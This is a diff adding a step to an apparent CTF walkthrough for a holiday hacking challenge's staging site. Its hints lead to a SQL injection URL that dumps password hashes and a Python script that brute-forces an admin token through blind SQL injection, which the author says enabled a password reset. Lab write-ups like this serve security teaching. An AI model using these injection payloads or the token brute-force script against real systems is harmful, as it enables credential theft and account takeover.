@@ -50,3 +50,56 @@ At the top right of the main courtyard, after thawing the Frost Tower door and f
   While "/detail/1,1 or 1=1" will successfully return all uniquecontact details, a UNION-based SQL injection will give you all database user password hashes too! You can build this exploit by reviewing the database tables sourcecode.
   https://staging.jackfrosttower.com/detail/1,2,4%20union%20select%20*%20from%20users--
 </details>
+
+4. Exploit the second vulnerability...again...
+<details>
+  <summary>What's this about?...</summary>
+  After getting SQL injection and the password hashes, can we login as someone? (I didn't crack any hashes...)
+</details>
+
+<details>
+  <summary>Hint 1</summary>
+  There are some super-protected pages that need special perms on top of a session. Can you figure out how to get in?
+</details>
+
+<details>
+  <summary>Hint 2</summary>
+  Take a look at how the "token" value is used and think about how it can be obtained and used.
+</details>
+
+<details>
+  <summary>Answer</summary>
+  I bruteforced the Super Admin token and reset their password and logged in as them. Code below. (CHANGE THE SESSION ID IN THE CODE!)
+
+```
+import requests, string
+ALL = list(string.ascii_letters)
+ALL.extend(string.digits)
+print(ALL)
+FINAL = ''
+
+def test():
+    global FINAL
+    for injection in ALL:
+        url = 'https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20users%20where%20id=1%20and%20token%20like%20%22HERE%25%22--'
+        url = url.replace('HERE',FINAL + injection)
+
+        r = requests.get(
+            url,
+            cookies={"connect.sid": "YOUR SESSION ID"}
+        )
+        # print(r.status_code)
+        # print(r.text)
+        if r.status_code!=200:
+            FINAL = FINAL + injection
+            print("FINAL: ", FINAL)
+            if len(FINAL)==32:
+                exit('DONE')
+
+for i in range(0,32):
+    test()
+
+print('DONE')
+```
+
+</details>
